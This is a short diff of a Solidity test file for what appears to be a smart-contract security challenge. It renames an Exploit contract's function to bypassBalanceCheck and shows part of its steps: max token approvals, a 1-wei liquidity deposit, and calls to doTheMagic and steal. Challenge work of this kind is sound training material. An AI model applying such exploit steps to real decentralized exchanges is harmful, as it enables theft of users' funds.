@@ -49,7 +49,7 @@ contract Challenge2Test is Test {
         token0.transfer(address(exp), 1 ether);
         token1.transfer(address(exp), 1 ether);
 
-        exp.bypassLiquidityCheck();
+        exp.bypassBalanceCheck();
         exp.doTheMagic();
         exp.steal();
 
@@ -85,7 +85,7 @@ contract Exploit {
         owner = _player;
     }
 
-    function bypassLiquidityCheck() public {
+    function bypassBalanceCheck() public {
         token0.approve(address(dex), type(uint256).max);
         token1.approve(address(dex), type(uint256).max);
         dex.addLiquidity(1 wei, 1 wei);
